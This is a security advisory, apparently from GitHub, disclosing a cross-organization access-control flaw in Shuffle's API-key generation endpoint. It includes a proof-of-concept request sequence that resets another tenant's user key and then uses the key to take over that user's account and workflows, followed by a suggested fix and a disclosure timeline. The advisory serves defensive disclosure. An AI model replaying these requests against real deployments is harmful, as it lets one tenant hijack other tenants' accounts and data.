https://github.com/Shuffle/Shuffle

## Finding: Cross-organization API-key reset leads to account takeover in Shuffle (HandleApiGeneration missing org-membership check)

## Details:

There's a cross-organization access-control flaw in Shuffle's API-key generation endpoint that results in cross-tenant account takeover.

`POST /api/v1/users/generateapikey` (handler `HandleApiGeneration` in shuffle-shared `shared.go`, POST branch ~lines 9928-9993) regenerates and returns the API key of a user identified by `user_id` in the request body. The handler only checks that (1) the caller is an admin and (2) the *target* is not a global admin. It fetches the target with `GetUser(ctx, t.UserId)`, which is a global lookup, and never verifies that the target user belongs to the caller's active organization. The sibling handler `HandleUpdateUser` (shared.go ~6074-6092) does perform exactly this `foundUser.Orgs` contains `userInfo.ActiveOrg.Id` check; `HandleApiGeneration` is missing it.

Because Shuffle is multi-tenant and API keys are full bearer credentials, an administrator of any single organization can reset and obtain the API key of any non-admin user in any other organization, then fully impersonate them.

### PoC
Live reproduction against `shuffle-backend:latest`. Org A = attacker (admin, member of Org A only). Org B = victim `victim@orgb.com` (role `user`, member of Org B + own org, NOT a member of Org A). Attacker and victim share no organization.

Attacker (authenticated only in Org A) resets the victim's key:
```
POST /api/v1/users/generateapikey
Authorization: Bearer <attacker Org-A key>     # or attacker session cookie
Content-Type: application/json

{"user_id":"226c419f-1539-4654-884a-a5a195706ff4"}   # victim id, in Org B
```
Response (the victim's brand-new plaintext API key is returned to the attacker):
```json
{"success": true, "username": "victim@orgb.com", "verified": false, "apikey": "29169998-d489-4c93-afc6-8f08b6b6503d"}
```

Account takeover with the stolen key:
```
GET /api/v1/users/getinfo
Authorization: Bearer 29169998-d489-4c93-afc6-8f08b6b6503d
-> 200  username: victim@orgb.com,  active_org: OrgB

GET /api/v1/workflows   (Org-Id: <Org B>)
Authorization: Bearer 29169998-d489-4c93-afc6-8f08b6b6503d
-> 200   (full access to Org B's workflows as the victim)
```
The victim's previously empty key is now this attacker-chosen value (confirmed in the datastore), and the victim's old credentials are invalidated where the new key supersedes them.


Suggested fix: in the POST path of `HandleApiGeneration`, after `GetUser`, require that the target user is a member of `userInfo.ActiveOrg.Id` (mirror the membership loop already used in `HandleUpdateUser`) and evaluate the requester's role within that organization.


### Disclosure

 - 19 June 2026 - reported via email
 - 19 June 2026 - report acknowledged
 - 25 June 2026 - received thanks and was offered PoC environment for further testing
 - 30 June 2026 - email exchanges on PoC
 - 26 August 2026 - follow up on fix

<img width="754" height="274" alt="image" src="https://github.com/user-attachments/assets/2ce1b9d3-54a0-4058-9348-7e88669efa9f" />
